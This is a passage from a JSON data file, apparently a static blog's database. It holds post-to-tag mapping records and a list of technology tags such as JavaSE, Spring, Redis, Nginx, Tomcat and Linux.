cjow44tvp000amfah7k01huwe","_id":"cjow44tx6003lmfahef684ob2"},{"post_id":"cjow44twb001kmfahumxd8l8j","tag_id":"cjow44twz0034mfahlh41yzdm","_id":"cjow44tx7003nmfah58fug6ri"},{"post_id":"cjow44tx3003emfahxmxggdwd","tag_id":"cjow44tvp000amfah7k01huwe","_id":"cjow44tx8003qmfah2h42j3yu"},{"post_id":"cjow44tx4003hmfahg55z1ppv","tag_id":"cjow44tvp000amfah7k01huwe","_id":"cjow44tx9003smfahs47l222p"},{"post_id":"cjow44twc001mmfah0q62h0eu","tag_id":"cjow44tx4003fmfahf1vonqta","_id":"cjow44tx9003vmfahiscav3jn"},{"post_id":"cjow44tx5003jmfah7g0o7vav","tag_id":"cjow44tw30011mfahxe59e2ef","_id":"cjow44txa003xmfah24hucupb"},{"post_id":"cjow44twd001omfahswxujq21","tag_id":"cjow44tx4003fmfahf1vonqta","_id":"cjow44txb003ymfahhch9hgst"},{"post_id":"cjow44tx7003omfahylwcmolb","tag_id":"cjow44tw30011mfahxe59e2ef","_id":"cjow44txb0040mfahrdqct7ek"},{"post_id":"cjow44tx8003rmfah7jn2k70m","tag_id":"cjow44tvp000amfah7k01huwe","_id":"cjow44txb0041mfahj5qhhk8m"},{"post_id":"cjow44twd001qmfahtc94x74j","tag_id":"cjow44tx8003pmfahtqgo53a7","_id":"cjow44txb0043mfahvb1c89if"},{"post_id":"cjow44txa003wmfahx8i8qox8","tag_id":"cjow44tw30011mfahxe59e2ef","_id":"cjow44txb0044mfahi42z2y6z"},{"post_id":"cjow44twe001smfah8uzst97z","tag_id":"cjow44tx9003umfahe4gcrr41","_id":"cjow44txc0046mfahkrv0ql9j"},{"post_id":"cjow44twf001umfahujh14jdf","tag_id":"cjow44txb003zmfahu8uf4aq5","_id":"cjow44txc0047mfahsdoewadw"},{"post_id":"cjow44twg001wmfah1wml7efb","tag_id":"cjow44txb0042mfahjfhdz94q","_id":"cjow44txc0049mfahknyfkx84"},{"post_id":"cjow44twi001ymfah44cerd7g","tag_id":"cjow44txb0045mfahima7a5ge","_id":"cjow44txc004amfahl4g88173"},{"post_id":"cjow44twi001zmfah5azodua4","tag_id":"cjow44txc0048mfahjk6m65y5","_id":"cjow44txc004cmfahq817ks6i"},{"post_id":"cjow44twj0022mfahgdlp4bf1","tag_id":"cjow44txc004bmfaha023qp6y","_id":"cjow44txd004emfahabzb8n5q"},{"post_id":"cjow44twl0025mfah73bffqsg","tag_id":"cjow44txd004dmfah3iesyed6","_id":"cjow44txd004gmfahhpa9kvyw"},{"post_id":"cjow44twm002amfahn5iqipcz","tag_id":"cjow44tx9003umfahe4gcrr41","_id":"cjow44txe004imfaht23zzpsu"},{"post_id":"cjow44twn002cmfahsvr4sz8k","tag_id":"cjow44txd004dmfah3iesyed6","_id":"cjow44txe004kmfahygx0n4jr"},{"post_id":"cjow44two002fmfahtmppps4z","tag_id":"cjow44txe004jmfahh05skpox","_id":"cjow44txf004mmfaht4gzv2en"},{"post_id":"cjow44twq002jmfahiq8trkr5","tag_id":"cjow44txe004lmfahatvpxncf","_id":"cjow44txf004omfahfm1hgsdd"},{"post_id":"cjow44twr002lmfahg77abr8z","tag_id":"cjow44txf004nmfahz7una9he","_id":"cjow44txg004qmfahcmr89tbq"},{"post_id":"cjow44twr002omfah32c9cl7m","tag_id":"cjow44txf004pmfah45rekhjq","_id":"cjow44txg004smfah6l0ywz3s"},{"post_id":"cjow44tws002qmfahcjwjllpw","tag_id":"cjow44txg004rmfah1huhn3j6","_id":"cjow44txh004umfahj6vjth0u"},{"post_id":"cjow44twt002smfahafe9ebrf","tag_id":"cjow44txg004tmfahrghy7lz7","_id":"cjow44txh004wmfahv9fgbxny"},{"post_id":"cjow44twu002umfahsx4k5ena","tag_id":"cjow44txd004dmfah3iesyed6","_id":"cjow44txh004ymfaheuy3yftl"},{"post_id":"cjow44twv002wmfaho3mso07t","tag_id":"cjow44txh004xmfahe5twv95m","_id":"cjow44txi0050mfahrmwaf5yn"},{"post_id":"cjow44tx00037mfahji1yuy7w","tag_id":"cjow44txi004zmfah66cge0kk","_id":"cjow44txi0052mfah8gauxel0"},{"post_id":"cjow44tx6003mmfaheztsmhjf","tag_id":"cjow44txi0051mfah72wddzwu","_id":"cjow44txk0054mfahyr5iz4wn"},{"post_id":"cjow44tx9003tmfahusol42eh","tag_id":"cjow44txi0053mfah2zrj9mfm","_id":"cjow44txk0055mfahznimynh9"}],"Tag":[{"name":"WorkFlow","_id":"cjow44tvi0002mfah1gboidcg"},{"name":"AOP","_id":"cjow44tvm0006mfah4wtouht2"},{"name":"JavaSE","_id":"cjow44tvp000amfah7k01huwe"},{"name":"javaWEB","_id":"cjow44tvw000mmfah174xl5tm"},{"name":"WINDOWS","_id":"cjow44tvy000rmfahw1z4ydb9"},{"name":"Shell","_id":"cjow44tw1000xmfahhja74wp6"},{"name":"JavaEE","_id":"cjow44tw30011mfahxe59e2ef"},{"name":"GIT","_id":"cjow44tw70019mfahd97i2rui"},{"name":"Struts2","_id":"cjow44tw9001dmfahnaveslbx"},{"name":"JQuery","_id":"cjow44twb001imfaht9bok07e"},{"name":"JSP","_id":"cjow44twd001nmfah4w7h22dg"},{"name":"面试","_id":"cjow44twe001rmfahthyyj92n"},{"name":"MySql","_id":"cjow44twg001vmfahyb9vgr5k"},{"name":"Utilities","_id":"cjow44twj0020mfahqw36dz91"},{"name":"NoSQL","_id":"cjow44twl0024mfah0c7pfshw"},{"name":"Kotlin","_id":"cjow44twm0029mfah45gajg7j"},{"name":"Mybatis","_id":"cjow44twz0034mfahlh41yzdm"},{"name":"Nginx","_id":"cjow44tx4003fmfahf1vonqta"},{"name":"Servlet","_id":"cjow44tx8003pmfahtqgo53a7"},{"name":"Redis","_id":"cjow44tx9003umfahe4gcrr41"},{"name":"Session","_id":"cjow44txb003zmfahu8uf4aq5"},{"name":"Solr","_id":"cjow44txb0042mfahjfhdz94q"},{"name":"SpringBoot","_id":"cjow44txb0045mfahima7a5ge"},{"name":"Springmvc","_id":"cjow44txc0048mfahjk6m65y5"},{"name":"Spring","_id":"cjow44txc004bmfaha023qp6y"},{"name":"Tomcat","_id":"cjow44txd004dmfah3iesyed6"},{"name":"XML","_id":"cjow44txe004jmfahh05skpox"},{"name":"Linux","_id":"cjow44txe004lmfahatvpxncf"},{"name":"Zookeeper","_id":"cjow44txf004nmfahz7una9he"},{"name":"Maven","_id":"cjow44txf004pmfah45rekhjq"},{"name":"Swagger","_id":"cjow44txg004rmfah1huhn3j6"},{"name":"WEB","_id":"cjow44txg004tmfahrghy7lz7"},{"name":"Schedule","_id":"cjow44txh004xmfahe5twv95m"},{"name":"Git","_id":"cjow44txi004zmfah66cge0kk"},{"name":"RPC","_id":"cjow44txi0051mfah72wddzwu"},{"name":"JS","_id":"cjow44txi0053mfah2zrj9mfm"}]}}